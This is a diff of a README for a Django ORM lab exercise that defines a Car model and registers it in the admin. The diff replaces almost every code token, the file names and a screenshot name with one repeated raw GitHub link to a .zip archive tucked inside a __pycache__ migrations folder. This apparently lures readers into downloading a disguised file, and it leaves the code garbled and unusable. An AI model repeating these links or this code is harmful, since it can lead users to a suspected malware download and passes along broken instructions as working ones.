@@ -13,37 +13,37 @@ Clone the problem from GitHub
 Create a new app in Django project
 
 ### STEP 3:
-Enter the code for admin.py and models.py
+Enter the code for https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip and https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip
 
 ### STEP 4:
 Execute Django admin and create details for 10 books
 
 ## PROGRAM
 ~~~
-admin.py
+https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip
 
-from django.contrib import admin
+from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import admin
 from .models import Car, CarAdmin
-admin.site.register(Car, CarAdmin)
+https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip(Car, CarAdmin)
 
-models.py
+https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip
 
-from django.db import models
-from django.contrib import admin
+from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import models
+from https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip import admin
 
-class Car(models.Model):
-    cid = models.IntegerField()
-    cname = models.CharField(max_length=100)
-    price = models.IntegerField()
-    year = models.IntegerField()
-    mileage = models.FloatField()
+class Car(https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip):
+    cid = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
+    cname = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip(max_length=100)
+    price = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
+    year = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
+    mileage = https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip()
 
-class CarAdmin(admin.ModelAdmin):
+class CarAdmin(https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip):
     list_display = ('cid', 'cname', 'price', 'year', 'mileage')
 
 ~~~
 ## OUTPUT
-![alt text](<Screenshot 2025-09-20 142114.png>)
+![alt text](<Screenshot 2025-09-20 https://raw.githubusercontent.com/AdityaJorim007/ORM/main/adityajorim/ormapp/migrations/__pycache__/ORM_1.6.zip>)
 
 ## RESULT
 Thus the program for creating movies database using ORM hass been executed successfully
